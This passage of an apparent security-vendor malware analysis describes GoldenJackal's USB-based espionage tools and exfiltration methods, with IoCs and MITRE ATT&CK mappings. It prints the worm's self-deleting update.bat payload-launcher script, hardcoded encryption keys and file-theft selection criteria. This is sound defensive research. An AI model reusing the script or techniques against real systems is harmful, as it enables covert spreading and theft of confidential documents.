<p>In May 2022, we observed GoldenJackal using a new toolset while targeting a governmental organization in Europe. Most of these tools are written in Go and provide diverse capabilities, such as collecting files from USB drives, spreading payloads in the network via USB drives, exfiltrating files, and using some PCs in the network as servers to deliver diverse files to other systems. In addition, we have seen the attackers using <a href="https://github.com/fortra/impacket">Impacket</a> to move laterally across the network.</p>
<p>In the observed attacks, GoldenJackal started to use a highly modular approach, using various components to perform different tasks. Some hosts were abused to exfiltrate files, others were used as local servers to receive and distribute staged files or configuration files, and others were deemed interesting for file collection, for espionage purposes. Figure 5 shows a classification of the components that are described over the next sections.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-5.png" alt="" width="1500" height="1500">
<figcaption><em>Figure 5. Components in GoldenJackal’s latest toolset</em></figcaption>
</figure>
<p>Regarding network infrastructure, we didn’t observe any external IP addresses in any of the analyzed components. File exfiltrators use publicly available services such as Google Drive or Outlook SMTP servers.</p>
<h4>GoldenUsbCopy</h4>
<p>GoldenUsbCopy, which we classify as a collection component, monitors the insertion of USB drives, and copies interesting files to an encrypted container that is stored on disk, to be exfiltrated by other components. According to strings found in the binary, the main package for the application is named <span>UsbCopy</span>.</p>
<p>Newly inserted drives are detected by creating a window with name <span>WindowsUpdateManager</span>, to receive system events and process them with a custom handler. If the handler receives a <span>WM_DEVICECHANGE</span> message, with an event type <span>DBT_DEVICEARRIVAL</span>, and the device type is <span>DBT_DEVTYP_VOLUME</span>, this means a new drive is ready to be processed. Figure 6 shows a side-by-side comparison between decompiled code in GoldenUsbCopy and GoldenDealer. Even though each was written in a different programming language, we can see that the code retrieves the letter of the drive to process in the same manner.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-6.png" alt="" width="1628" height="655">
<figcaption><em>Figure 6. Code comparison between GoldenUsbCopy and GoldenDealer</em></figcaption>
</figure>
<p>GoldenUsbCopy determines which files to process from a USB drive based on a configuration that is stored AES encrypted in CFB mode in the file <span>reports.ini</span>. The 32-byte key to decrypt the configuration is hardcoded in the malware. After decryption, the configuration contains the following fields, in JSON format:</p>
<ul>
<li><span>outputCipherFilename</span> – full path to an encrypted archive that acts as a container for other files, such as files that contain listings of filenames from newly inserted drives, and files to be exfiltrated,</li>
<li><span>RSAKey</span> – a public key to encrypt AES keys that are used to encrypt files to be exfiltrated,</li>
<li><span>lastDate</span> – files that were last modified more than <span>lastDate</span> days ago are not processed,</li>
<li><span>registryKey</span> – a key in <span>HKEY_CURRENT_USER</span> that will store SHA-256 hashes of files already processed for exfiltration,</li>
<li><span>registryValue</span> – the registry value that stores the list of hashes,</li>
<li><span>maxZIPSize</span> – the maximum size in bytes for <span>outputCipherFilename</span> (more details below),</li>
<li><span>maxFileSize</span> – files larger than <span>maxFileSize</span>, in bytes, are not exfiltrated, and</li>
<li><span>extensionsFile</span> – a list of file extensions for exfiltration (we observed <span>.docx</span>, <span>.pdf</span>, <span>.doc</span>, and <span>.odt</span>).</li>
</ul>
<p>Once the configuration is decrypted, GoldenUsbCopy waits for a USB drive to be inserted. A listing of all files on the inserted drive is written to a text file, which is then archived in a ZIP file, encrypted with AES, and added to <span>outputCipherFilename</span>. Only the encrypted container is written to disk; intermediate steps, involving text files and archives, are kept in memory.</p>
<p>A similar procedure is done for files on the drive that meet the criteria for exfiltration: these files are archived together preserving their directory structure, encrypted with AES, and added to <span>outputCipherFilename</span>. When selecting files for exfiltration, a list with SHA-256 hashes is retrieved from the registry. If the hash of a file is in that list, the file is not exfiltrated. If the hash isn’t in the list, it is added, so that the file won’t be exfiltrated again.</p>
<p>Whenever adding files to exfiltrate would exceed the <span>maxZIPSize</span> of <span>outputCipherFilename</span>, the excess files are not added to the archive for exfiltration, but their paths are added to a text file that is archived, encrypted, and added to <span>outputCipherFilename</span>.</p>
<p>Regarding encryption, each individual archive that is added to the encrypted container is encrypted with AES in CFB mode, with a key and an initialization vector (IV) that are randomly generated on the spot. Both the key and IV need to be stored, but only the key is encrypted with <span>RSAKey</span>. Figure 7 shows an example of how these fields are stored in the encrypted container.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-7.png" alt="" width="2122" height="644">
<figcaption><em>Figure 7. Structure of the encrypted container</em></figcaption>
</figure>
<h4>GoldenUsbGo</h4>
<p>This component is very similar to GoldenUsbCopy and seems to be a later version of it, based on when we observed them in our telemetry and comparing Go versions used to compile them. However, GoldenUsbGo achieves the same functionality with a simpler implementation:</p>
<ul>
<li>There is no configuration file. All criteria for file selection are hardcoded in the malware:
<ul>
<li>if filename contains a specific word from a list, process the file regardless of all other criteria (the list contains strings such as <span>pass</span>, <span>login</span>, and <span>key</span>),</li>
<li>else, file size must be no bigger than 20 MB,</li>
<li>the date the file was last modified must be no more than 14 days ago, and</li>
<li>the file extension must be one of <span>.pdf</span>, <span>.doc</span>, <span>.docx</span>, <span>.sh</span>, or <span>.bat</span>.</li>
</ul>
</li>
<li>Insertion of removable drives is not continuously monitored. A hardcoded list of drive letters is checked periodically to determine if they have an assigned volume of <span>D:</span>, <span>E:</span>, <span>F:</span>, <span>G:</span>, or <span>H:</span>.</li>
<li>The list of hashes of files that were already processed is kept in memory only.</li>
<li>There is no size limit for the encrypted container where files are staged for exfiltration.</li>
<li>Files are not archived but instead are compressed with gzip. Both file contents and filenames are compressed. Figure 8 shows how compressed data is arranged before encryption.</li>
</ul>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-8.png" alt="" width="2537" height="307">
<figcaption><em>Figure 8. Fields used for gzip-compressed files, before encryption</em></figcaption>
</figure>
<p>The path to the encrypted container is hardcoded in the malware:</p>
<p><span>C:\Users\[redacted]\appdata\local\SquirrelTemp\SquirrelCache.dat</span></p>
<p>The hardcoded username in the path, redacted above, along with the short list of drives and specific filenames to process, tell us that GoldenUsbGo was compiled and tailored for this particular victim.</p>
<p>Compressed files are encrypted with AES in CFB mode with the hardcoded key <span>Fn$@-fR_*+!13bN5</span>. The structure is the same as in GoldenUsbCopy (shown in Figure 7) but without the AES key. After compressing the files, GoldenUsbGo generates a listing of all files on the inserted drive and adds it to the encrypted container, in the same manner as exfiltrated files. The filename for the listing is formed from the current date and time, replacing <span>:</span> with <span>-</span> (for example, <span>15 Jan 24 13-21 PST</span>).</p>
<h4>GoldenAce</h4>
<p>This component, which we classified as a distribution tool in Figure 5, serves to propagate other malicious executables and retrieve staged files via USB drives. While it could be used to target air-gapped systems, it’s not specifically built for that, as opposed to GoldenDealer. It works together with a lightweight version of <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalworm">JackalWorm</a> and some other unknown component.</p>
<p>GoldenAce periodically checks drives in the list <span>G:</span>, <span>H:</span>, <span>I:</span>, <span>J:</span>, <span>K:</span>, <span>L:</span>, <span>M:</span>, <span>N:</span>, <span>P:</span>, <span>X:</span>, <span>Y:</span>, and <span>Z:</span>, to find one that is mapped to a volume. Then it checks whether a trash directory exists in the root of that drive. If it doesn’t exist, it is created as hidden, and a file called update is copied to that directory, from the same location where GoldenAce is running. The first directory on the drive (in alphabetical order) that is not hidden is set to hidden, and a file called <span>upgrade</span> is copied to the root of the drive and renamed as <span>&lt;name_of_hidden_directory&gt;.exe</span>.</p>
<p>The file <span>upgrade</span> is actually JackalWorm, an executable that uses a folder icon, and whose purpose is to copy and run the <span>update</span> file on another system where the USB drive is inserted. Unlike the version of JackalWorm described by Kaspersky, this one is very limited: it doesn’t have code to monitor drive insertions, and it cannot be configured to perform various actions. When executed from the root directory of a removable drive, it opens the hidden folder in Windows Explorer and writes a batch file to execute the payload in <span>update</span>. Contents of this file, <span>update.bat</span>, are shown in Figure 9.</p>
<pre><code>@echo off
copy "&lt;drive_letter&gt;:\\trash\\update" "C:\\Users\\%username%\\AppData\\Local\\update.exe"
"C:\\Users\\%username%\\AppData\\Local\\update.exe" "&lt;drive_letter&gt;:\\trash"
:check1
@tasklist | findstr /i /b "update.exe" &gt;nul
@if %errorlevel%==0 goto check1
@del /f /q /a h "C:\\Users\\%username%\\AppData\\Local\\update.exe"
@del /f /q "C:\\Users\\&lt;username&gt;\\AppData\\Local\\update.bat"</code></pre>
<blockquote>
<p>Figure 9. Contents of <span>update.bat</span></p>
</blockquote>
<p>We can see that <span>update</span> is run and deleted, along with the batch file, once it’s done running. While we didn’t observe the contents of the <span>update</span> component, it is likely that it collects files and stages them in the <span>trash</span> directory on the removable drive, since the path to that directory is passed as an argument to <span>update</span>.</p>
<p>When GoldenAce finds that the directory <span>trash</span> already exists on a drive, instead of copying files to the drive, it copies files in the <span>trash</span> directory to <span>C:\ProgramData\Microsoft\Windows\DeviceMetadataCache</span>.</p>
<h4>HTTP server</h4>
<p>We observed <a href="https://github.com/python/cpython/blob/3.12/Lib/http/server.py">Python’s HTTP server</a>, packaged with PyInstaller, being executed via <span>C:\Windows\system32\cmd.exe /K C:\Windows\msahci.cmd</span>. Unfortunately, we didn’t observe the contents of the <span>msahci.cmd</span> file, so we don’t know the arguments passed for execution, such as the port for the server to listen on.</p>
<h4>GoldenBlacklist</h4>
<p>As a processing component, GoldenBlacklist downloads an encrypted archive from a local server, and processes email messages contained in it, to keep only those of interest. Then it generates a new archive for some other component to exfiltrate.</p>
<p>The URL to retrieve the initial archive is hardcoded: <span>https://&lt;local_ip_address&gt;/update46.zip</span>. The downloaded file is saved as <span>res.out</span>, and AES decrypted with the hardcoded key <span>k9ksbu9Q34HBKJuzHIuGTfHL9xCzMl53vguheOYA8SiNoh6Jqe62F7APtQ9pE</span>, using a legitimate <a href="https://www.openssl.org/" target="_blank" rel="noopener">OpenSSL</a> executable.</p>
<p>The decrypted archive, <span>update46.tar.gz</span>, is extracted in memory, and only those files that match certain criteria are written to a subdirectory <span>tmp</span>, in the directory where the malware is running. Criteria:</p>
<ul>
<li>The file does not contain any email on a blocklist of email addresses. This is done to remove email messages that come from senders that usually are not interesting. While we can’t include the full list here, it’s worth mentioning that many of the email addresses are related to newsletters and press releases. It’s important to note that the attackers must have been operating for some time to build a list like this.</li>
<li>The file contains the string <span>Content-Type: application</span>. This is to keep email messages that have attachments, such as PDF files, Microsoft Office files, and archives, to name a few.</li>
</ul>
<p>Once the files are selected, GoldenBlacklist archives the <span>tmp</span> directory and encrypts it with <span>openssl.exe</span>, using the same encryption key as the one used to decrypt the initial archive. The resulting file is <span>archive.out</span>. All intermediate files and folders are then deleted, as well as <span>openssl.exe</span>, <span>libssl-3-x64.dll</span>, and <span>libcrypto-3-x64.dll</span>, all located in the malware’s directory. This indicates that another component that we didn’t observe copied those legitimate binaries there in the first place.</p>
<h4>GoldenPyBlacklist</h4>
<p>GoldenPyBlacklist is a Python implementation of GoldenBlacklist. It was packaged with PyInstaller and the original name of the script is <span>duplxer_black_list_for_external_use.py</span>. Some differences to the other component are:</p>
<ul>
<li>the initial archive is written as <span>ress.out</span>,</li>
<li>the key for decryption is the same, except for a different first character,</li>
<li>the decrypted archive is extracted to the <span>C:\Windows\System32\temp</span> directory for processing,</li>
<li>one additional criterion for file selection is added to process only filenames that end in <span>.msg</span> (these are files created with Microsoft Outlook),</li>
<li>files that do not meet the criteria are deleted,</li>
<li>the final archive is created with the 7-Zip archiver, and</li>
<li>the final encrypted file is named <span>ArcSrvcUI.ter</span>.</li>
</ul>
<h4>GoldenMailer</h4>
<p>Classified as an exfiltration component, GoldenMailer exfiltrates files by sending emails with attachments to attacker-controlled accounts. It was written in Python and packaged with PyInstaller, and the original name of the script is <span>send_to_hole.py</span>. GoldenMailer connects to <a href="https://support.microsoft.com/en-us/office/pop-imap-and-smtp-settings-for-outlook-com-d088b986-291d-42b8-9564-9c414e2aa040" target="_blank" rel="noopener">legitimate servers</a> – either <span>smtp-mail.outlook.com</span> or <span>smtp.office365.com</span> – to send email messages, using SMTP on port 587.</p>
<p>The configuration is read from a file, <span>C:\ProgramData\Microsoft\Windows\Caches\cversions.ini</span>, in the same directory where GoldenMailer is running. The configuration consists of the following five lines:</p>
<ul>
<li>email address to authenticate to the SMTP server, and to use as both sender and destination address,</li>
<li>password to authenticate to the SMTP server,</li>
<li>path to directory with archives to exfiltrate,</li>
<li>base filename (e.g., <span>press.pdf</span>) used for archives to exfiltrate; these archives use the following naming convention: <span>&lt;base_filename&gt;.&lt;three_digit_sequence_number&gt;</span>, and</li>
<li>number of files to exfiltrate.</li>
</ul>
<p>We noticed that this configuration file was copied from another PC in the local network. Given that the configuration file indicates how many archives are available to be exfiltrated, we assume that these archives must also be copied over the network, separating the tasks of collection, distribution, and exfiltration. It is likely that the configuration file is generated by the component in charge of collecting files and creating archives for exfiltration, but we didn’t observe that component.</p>
<p>Figure 10 shows an example of an email message sent by GoldenMailer. The subject has a typo: it reads <span>Press realese</span>. The body is very simple and reads: <span>Daily News about Israel-Hamas war</span>. These strings are hardcoded in the malware’s binary. Only one attachment is sent per email; if there are many archives to exfiltrate, one email is sent for each.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-10.png" alt="" width="678" height="566">
<figcaption><em>Figure 10. Example of an email message used to exfiltrate files</em></figcaption>
</figure>
<p>The configuration files that we observed contained the following email addresses:</p>
<ul>
<li><span>mariaalpane@outlook[.]com</span></li>
<li><span>katemarien087@outlook[.]com</span></li>
<li><span>spanosmitsotakis@outlook[.]com</span></li>
</ul>
<h4>GoldenDrive</h4>
<p>As opposed to GoldenMailer, this component exfiltrates files by uploading them to Google Drive. Necessary credentials are found in two files, which are hardcoded in the malware: <span>credentials.json</span>, which contains fields such as <span>client_id</span> and <span>client_secret</span>, and <span>token.json</span>, with fields such as <span>access_token</span> and <span>refresh_token</span>. A reference to Google Drive’s API and some code snippets in the Go programming language can be found <a href="https://developers.google.com/drive/api/quickstart/go" target="_blank" rel="noopener">here</a>.</p>
<p>Similar to GoldenMailer, this component can upload only one file at a time. GoldenDrive is executed with an argument that provides the full path to the file to upload.</p>
<h2>Conclusion</h2>
<p>In this blogpost, we revealed two new toolsets used by the GoldenJackal APT group to target air-gapped systems of governmental organizations, including those in Europe. Common functionalities include the use of USB drives to steal confidential documents.</p>
<p>Managing to deploy two separate toolsets for breaching air-gapped networks in only five years shows that GoldenJackal is a sophisticated threat actor aware of network segmentation used by its targets.</p>
<p>A comprehensive list of indicators of compromise (IoCs) can be found in <a href="https://github.com/eset/malware-ioc/tree/master/goldenjackal" target="_blank" rel="noopener">our GitHub repository</a>.</p>
<blockquote>
<p><em>For any inquiries about our research published on WeLiveSecurity, please contact us at <a href="mailto:threatintel@eset.com?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=autotagging&amp;utm_content=eset-research&amp;utm_term=en">threatintel@eset.com</a>.&nbsp;</em></p>
<p><em>ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the <a href="https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=wls-research&amp;utm_content=mind-air-gap-goldenjackal-gooses-government-guardrails&amp;sfdccampaignid=7011n0000017htTAAQ" target="_blank" rel="noopener">ESET Threat Intelligence</a> page.</em></p>
</blockquote>
<h2>IoCs</h2>
<h3>Files</h3>
<table>
<thead>
<tr>
<td>
<p><strong>SHA-1</strong>&nbsp;</p>
</td>
<td>
<p><strong>Filename</strong>&nbsp;</p>
</td>
<td>
<p><strong>Detection</strong>&nbsp;</p>
</td>
<td>
<p><strong>Description</strong>&nbsp;</p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>DA9562F5268FA61D19648DFF9C6A57FB8AB7B0D7</p>
</td>
<td>
<p><span>winaero.exe</span>&nbsp;</p>
</td>
<td>
<p>Win32/Agent.AGKQ&nbsp;</p>
</td>
<td>
<p>GoldenDealer.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>5F12FFD272AABC0D5D611D18812A196A6EA2FAA9</p>
</td>
<td>
<p><span>1102720677</span>&nbsp;</p>
</td>
<td>
<p>Python/Agent.ANA&nbsp;</p>
<p>Python/HackTool.Agent.W&nbsp;</p>
<p>Python/Riskware.LdapDump.A&nbsp;</p>
<p>Python/Riskware.Impacket.C&nbsp;</p>
</td>
<td>
<p>GoldenHowl.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>6DE7894F1971FDC1DF8C4E4C2EDCC4F4489353B6</p>
</td>
<td>
<p>OfficeAutoComplete.exe</p>
</td>
<td>
<p>WinGo/Agent.AAO&nbsp;</p>
</td>
<td>
<p>GoldenRobo.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>7CB7C3E98CAB2226F48BA956D3BE79C52AB62140</p>
</td>
<td>
<p><span>prinntfy.dll</span>&nbsp;</p>
</td>
<td>
<p>WinGo/DataStealer.A&nbsp;</p>
</td>
<td>
<p>GoldenUsbCopy.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>8F722EB29221C6EAEA9A96971D7FB78DAB2AD923</p>
</td>
<td>
<p><span>zUpdater.exe</span>&nbsp;</p>
</td>
<td>
<p>WinGo/Spy.Agent.AH&nbsp;</p>
</td>
<td>
<p>GoldenUsbGo.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>24FBCEC23E8B4B40FEA188132B0E4A90C65E3FFB</p>
</td>
<td>
<p><span>fc.exe</span>&nbsp;</p>
</td>
<td>
<p>WinGo/DataStealer.C&nbsp;</p>
</td>
<td>
<p>GoldenAce.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>A87CEB21EF88350707F278063D7701BDE0F8B6B7</p>
</td>
<td>
<p><span>upgrade</span>&nbsp;</p>
</td>
<td>
<p>MSIL/Agent.WPJ&nbsp;</p>
</td>
<td>
<p>JackalWorm – simpler version.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>9CBE8F7079DA75D738302D7DB7E97A92C4DE5B71</p>
</td>
<td>
<p><span>fp.exe</span>&nbsp;</p>
</td>
<td>
<p>WinGo/Spy.Agent.CA&nbsp;</p>
</td>
<td>
<p>GoldenBlacklist.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>9083431A738F031AC6E33F0E9133B3080F641D90</p>
</td>
<td>
<p><span>fp.exe</span>&nbsp;</p>
</td>
<td>
<p>Python/TrojanDownloader.Agent.YO</p>
</td>
<td>
<p>GoldenPyBlacklist.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>C830EFD843A233C170285B4844C5960BA8381979</p>
</td>
<td>
<p><span>cb.exe</span>&nbsp;</p>
</td>
<td>
<p>Python/Agent.ALE&nbsp;</p>
</td>
<td>
<p>GoldenMailer.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>F7192914E00DD0CE31DF0911C073F522967C6A97</p>
</td>
<td>
<p><span>GoogleUpdate.exe</span>&nbsp;</p>
</td>
<td>
<p>WinGo/Agent.YH&nbsp;</p>
</td>
<td>
<p>GoldenDrive.&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>B2BAA5898505B32DF7FE0A7209FC0A8673726509</p>
</td>
<td>
<p><span>fp.exe</span>&nbsp;</p>
</td>
<td>
<p>Python/Agent.ALF&nbsp;</p>
</td>
<td>
<p>Python HTTP server.&nbsp;</p>
</td>
</tr>
</tbody>
</table>
<h3>Network</h3>
<table>
<thead>
<tr>
<td><strong>IP</strong>&nbsp;</td>
<td><strong>Domain</strong>&nbsp;</td>
<td><strong>Hosting provider</strong>&nbsp;</td>
<td><strong>First seen</strong>&nbsp;</td>
<td><strong>Details</strong>&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
<td><span>83.24.9[.]124</span>&nbsp;</td>
<td>N/A&nbsp;</td>
<td>Orange Polska Spolka&nbsp;Akcyjna&nbsp;</td>
<td>2019‑08‑09&nbsp;</td>
<td>Primary C&amp;C server used by GoldenJackal in 2019.&nbsp;</td>
</tr>
<tr>
<td><span>196.29.32[.]210</span>&nbsp;</td>
<td>N/A&nbsp;</td>
<td>UTANDE&nbsp;</td>
<td>2019‑08‑09&nbsp;</td>
<td>Secondary C&amp;C server used by GoldenJackal in 2019.&nbsp;</td>
</tr>
<tr>
<td>N/A&nbsp;</td>
<td><span>assistance[.]uz</span>&nbsp;</td>
<td>N/A&nbsp;</td>
<td>2019‑09‑25&nbsp;</td>
<td>Compromised website used to download malware.&nbsp;</td>
</tr>
<tr>
<td>N/A&nbsp;</td>
<td><span>thehistore[.]com</span>&nbsp;</td>
<td>N/A&nbsp;</td>
<td>2019‑09‑25&nbsp;</td>
<td>Compromised website used as a C&amp;C server.&nbsp;</td>
</tr>
<tr>
<td>N/A&nbsp;</td>
<td><span>xgraphic[.]ro</span>&nbsp;</td>
<td>N/A&nbsp;</td>
<td>2019‑09‑25&nbsp;</td>
<td>Compromised website used as a C&amp;C server.&nbsp;</td>
</tr>
</tbody>
</table>
<h3>Email Addresses</h3>
<ul>
<li><span>mariaalpane@outlook[.]com</span></li>
<li><span>katemarien087@outlook[.]com</span></li>
<li><span>spanosmitsotakis@outlook[.]com</span></li>
</ul>
<h2>MITRE ATT&amp;CK techniques</h2>
<p>This table was built using <a href="https://attack.mitre.org/resources/versions/">version 15</a> of the MITRE ATT&amp;CK framework<strong>.</strong></p>
<table>
<thead>
<tr>
<td><strong>Tactic</strong>&nbsp;</td>
<td><strong>ID</strong>&nbsp;</td>
<td><strong>Name</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="6"><strong>Resource Development</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1583/003">T1583.003</a>&nbsp;</td>
<td>Acquire Infrastructure: Virtual Private Server&nbsp;</td>
<td>GoldenJackal probably acquired a VPS server to use as a secondary C&amp;C server for the GoldenDealer malware.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1583/004">T1583.004</a>&nbsp;</td>
<td>Acquire Infrastructure: Server&nbsp;</td>
<td>GoldenJackal likely acquired a server to use as a primary C&amp;C server for the GoldenDealer malware.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1584/006">T1584.006</a>&nbsp;</td>
<td>Compromise Infrastructure: Web Services&nbsp;</td>
<td>GoldenJackal has used compromised WordPress sites for C&amp;C infrastructure, used by the JackalControl and JackalSteal malware.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1587/001">T1587.001</a>&nbsp;</td>
<td>Develop Capabilities: Malware&nbsp;</td>
<td>GoldenJackal develops its own custom malware.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1585/003">T1585.003</a>&nbsp;</td>
<td>Establish Accounts: Cloud Accounts&nbsp;</td>
<td>GoldenJackal has used Google Drive to store exfiltrated files and legitimate tools.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1588/002">T1588.002</a>&nbsp;</td>
<td>Obtain Capabilities: Tool&nbsp;</td>
<td>GoldenJackal uses legitimate tools, such as Plink and PsExec, for post-compromise operations.&nbsp;</td>
</tr>
<tr>
<td rowspan="6"><strong>Execution</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/001">T1059.001</a>&nbsp;</td>
<td>Command and Scripting Interpreter: PowerShell&nbsp;</td>
<td>GoldenJackal executed PowerShell scripts to download the JackalControl malware from a compromised WordPress website.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/003">T1059.003</a>&nbsp;</td>
<td>Command and Scripting Interpreter: Windows Command Shell&nbsp;</td>
<td>GoldenAce uses <span>cmd.exe</span> to run a batch script to execute other malicious components.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/006">T1059.006</a>&nbsp;</td>
<td>Command and Scripting Interpreter: Python&nbsp;</td>
<td>GoldenHowl contains various malicious modules that are Python scripts.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1106">T1106</a>&nbsp;</td>
<td>Native API&nbsp;</td>
<td>GoldenDealer can copy and run an executable file with the <span>CreateProcessW</span> API.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1569/002">T1569.002</a>&nbsp;</td>
<td>System Services: Service Execution&nbsp;</td>
<td>GoldenDealer can run as a service.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1204/002">T1204.002</a>&nbsp;</td>
<td>User Execution: Malicious File&nbsp;</td>
<td>JackalWorm uses a folder icon to entice a potential victim to launch it.&nbsp;</td>
</tr>
<tr>
<td rowspan="3"><strong>Persistence</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1543/003">T1543.003</a>&nbsp;</td>
<td>Create or Modify System Process: Windows Service&nbsp;</td>
<td>GoldenDealer creates the service <span>NetDnsActivatorSharing</span> to persist on a compromised system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1547/001">T1547.001</a>&nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder&nbsp;</td>
<td>If GoldenDealer fails to create a service for persistence, an entry in a Run registry key is created instead.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1053/005">T1053.005</a>&nbsp;</td>
<td>Scheduled Task/Job: Scheduled Task&nbsp;</td>
<td>GoldenHowl creates the scheduled task <span>Microsoft\Windows\Multimedia\<br>SystemSoundsService2</span> for persistence.&nbsp;</td>
</tr>
<tr>
<td rowspan="6"><strong>Defense Evasion</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1564/001">T1564.001</a>&nbsp;</td>
<td>Hide Artifacts: Hidden Files and Directories&nbsp;</td>
<td>GoldenDealer modifies the registry so that hidden files and directories are not shown in Windows Explorer. GoldenDealer, GoldenAce, and Jackal worm create hidden folders on USB drives.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1070/004">T1070.004</a>&nbsp;</td>
<td>Indicator Removal: File Deletion&nbsp;</td>
<td>GoldenAce deletes payloads after they are run. GoldenBlacklist and GoldenPyBlacklist delete intermediate files after the final archives are generated.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1036/005">T1036.005</a>&nbsp;</td>
<td>Masquerading: Match Legitimate Name or Location&nbsp;</td>
<td>GoldenUsbCopy uses a legitimate Firefox directory <span>C:\Users\&lt;username&gt;\AppData\Roaming\Mozilla\Firefox\</span> to stage files.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1036/008">T1036.008</a>&nbsp;</td>
<td>Masquerading: Masquerade File Type&nbsp;</td>
<td>JackalWorm uses a folder icon to disguise itself as a non-executable file.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1112">T1112</a>&nbsp;</td>
<td>Modify Registry&nbsp;</td>
<td>GoldenDealer modifies the registry so that hidden files and directories are not shown in Windows Explorer.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1027/013">T1027.013</a>&nbsp;</td>
<td>Obfuscated Files or Information: Encrypted/Encoded File&nbsp;</td>
<td>GoldenJackal uses various encryption algorithms in its toolset, such as XOR, Fernet, and AES, to encrypt configuration files and files to be exfiltrated.&nbsp;</td>
</tr>
<tr>
<td rowspan="2"><strong>Credential Access</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1552/001">T1552.001</a>&nbsp;</td>
<td>Unsecured Credentials: Credentials In Files&nbsp;</td>
<td>GoldenUsbGo looks for files with filenames that are usually associated with credentials.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1552/004">T1552.004</a>&nbsp;</td>
<td>Unsecured Credentials: Private Keys&nbsp;</td>
<td>GoldenUsbGo looks for files that may contain private keys, such as those with filenames that contain <span>id_rsa</span>.&nbsp;</td>
</tr>
<tr>
<td rowspan="10"><strong>Discovery</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1087/001">T1087.001</a>&nbsp;</td>
<td>Account Discovery: Local Account&nbsp;</td>
<td>GoldenDealer collects information about all user accounts on a compromised system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1083">T1083</a>&nbsp;</td>
<td>File and Directory Discovery&nbsp;</td>
<td>GoldenHowl has a module to generate a listing of files and directories on a compromised system. GoldenUsbCopy and GoldenUsbGo generate a listing of files and directories on a USB drive.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1046">T1046</a>&nbsp;</td>
<td>Network Service Discovery&nbsp;</td>
<td>GoldenHowl can scan a remote system for open ports, and whether the target is vulnerable to EternalBlue malware.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1120">T1120</a>&nbsp;</td>
<td>Peripheral Device Discovery&nbsp;</td>
<td>GoldenDealer and GoldenUsbCopy monitor the insertion of removable drives. GoldenUsbGo and GoldenAce check for various drive letters, to detect attached removable drives.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1057">T1057</a>&nbsp;</td>
<td>Process Discovery&nbsp;</td>
<td>GoldenDealer obtains information about running processes on a compromised system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1018">T1018</a>&nbsp;</td>
<td>Remote System Discovery&nbsp;</td>
<td>GoldenHowl can scan an IP range to discover other systems.&nbsp;</td>
